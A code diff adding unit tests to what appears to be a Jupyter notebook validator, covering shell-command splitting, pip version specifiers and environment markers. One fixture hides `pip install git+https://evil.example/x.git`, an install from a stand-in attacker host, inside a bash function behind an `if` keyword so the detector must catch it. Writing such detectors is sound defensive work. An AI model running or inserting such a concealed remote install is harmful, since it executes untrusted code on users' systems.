@@ -5314,3 +5314,108 @@ def test_a_negation_covers_the_whole_pipeline():
         assert ("!pip install a", True) in nv._split_chained(cell), cell
     # The fallback side reads the same status: a pipeline that succeeds skips its `||`.
     assert ("!pip install a", True) in nv._split_chained("!! true | false || pip install a")
+
+
+def test_a_definition_behind_a_body_keyword_is_still_read():
+    """`then f(){ pip install ...; }` defines f, and the header has to come off.
+
+    Matching the definition before the keyword left the header standing, so the body never
+    reached PIP_LINE_RE and R-INST-001 saw no install where bash runs one.
+    """
+    nv = _load_notebook_validator_module()
+
+    cell = "!if true; then f(){ pip install git+https://evil.example/x.git; }; fi; f"
+    assert ("!pip install git+https://evil.example/x.git", False) in nv._split_chained(cell)
+    assert [f.rule for f in nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0)] == ["R-INST-001"]
+    # Uncalled, the body is still unreachable rather than merely conditional.
+    assert "!pip install git+https://evil.example/x.git" not in [
+        text for text, _ in nv._split_chained("!if true; then f(){ pip install git+https://evil.example/x.git; }; fi")
+    ]
+
+
+def test_a_landing_pinned_to_an_excluded_release_names_nothing():
+    """`<0.12,<=0.11,!=0.11.0` admits no 0.11 at all, since the cap pins it to 0.11.0.
+
+    Handing back the ceiling-derived 0.11 fabricated a pairing R-INST-004 then accepted.
+    """
+    nv = _load_notebook_validator_module()
+
+    assert nv._effective_version(
+        '!pip install "torchcodec<0.12,<=0.11,!=0.11.0"', "torchcodec", "0.11.0"
+    ) == (None, True)
+    # Without the cap the rest of the 0.11 line is still open, so the landing stands.
+    assert nv._effective_version(
+        '!pip install "torchcodec>=0.11,<0.12,!=0.11.0"', "torchcodec", "0.11.0"
+    ) == ("0.11", True)
+
+
+def test_a_prerelease_landing_is_promoted_only_where_the_release_is_admitted():
+    """`>=0.12.0a1,<0.12.0rc1` stops below every stable 0.12.
+
+    Promoting the landing to `0.12.0` there cleared an ABI floor the installed codec is
+    under, so R-INST-004 took the ABI-stable short circuit on a prerelease.
+    """
+    nv = _load_notebook_validator_module()
+
+    assert nv._effective_version(
+        '!pip install "torchcodec>=0.12.0a1,<0.12.0rc1"', "torchcodec", "0.11.0"
+    ) == ("0.12.0a1", True)
+    # A window that does admit the stable release still names it.
+    assert nv._effective_version(
+        '!pip install "torchcodec~=0.12.0rc1"', "torchcodec", "0.11.0"
+    ) == ("0.12.0", True)
+
+
+def test_a_marker_term_the_oracle_cannot_answer_is_only_one_term():
+    """A decisive `false and unknown` is still false.
+
+    Bailing out on any unavailable field replayed a pin pip certainly skips, and R-INST-004
+    reported an incompatibility against a compatible baseline.
+    """
+    nv = _load_notebook_validator_module()
+
+    environment = nv._marker_environment({"python": "3.13.15"})
+    assert "implementation_name" not in environment  # the case this is about
+    decided = "python_version < '3.0' and implementation_name == 'cpython'"
+    assert nv._requirement_applies(f"torchcodec==0.10; {decided}", environment) is False
+    # An unknown term that could still decide the marker stays conservative.
+    for undecided in (
+        "python_version >= '3.0' and implementation_name == 'cpython'",
+        "python_version < '3.0' or implementation_name == 'cpython'",
+        "implementation_name == 'cpython'",
+    ):
+        assert nv._requirement_applies(f"torchcodec==0.10; {undecided}", environment) is True
+    # Parentheses and `and` binding tighter than `or` are both read.
+    assert (
+        nv._requirement_applies(
+            "torchcodec==0.10; (python_version < '3.0' or python_version > '4')"
+            " and sys_platform == 'linux'",
+            environment,
+        )
+        is False
+    )
+    assert nv._requirement_applies("torchcodec==0.10; python_version >= '3.10'", environment)
+
+
+def test_a_quoted_loop_word_is_one_literal_iteration():
+    """`for x in '*'` iterates over a literal star, so its body certainly runs.
+
+    Reading the raw word treated the quoted glob as possibly empty and dropped the install
+    from the replay.
+    """
+    nv = _load_notebook_validator_module()
+
+    assert ("!pip install torch==2.11.0", False) in nv._split_chained(
+        "!for x in '*'; do pip install torch==2.11.0; done"
+    )
+    # Unquoted, and inside double quotes where it still expands, it stays indeterminate.
+    for cell in (
+        "!for x in *; do pip install torch==2.11.0; done",
+        '!for x in "$LIST"; do pip install torch==2.11.0; done',
+        "!for x in $LIST; do pip install torch==2.11.0; done",
+    ):
+        assert ("!pip install torch==2.11.0", True) in nv._split_chained(cell), cell
+    # A double-quoted glob is literal too: only `$` and a backquote survive those quotes.
+    assert ("!pip install torch==2.11.0", False) in nv._split_chained(
+        '!for x in "*"; do pip install torch==2.11.0; done'
+    )
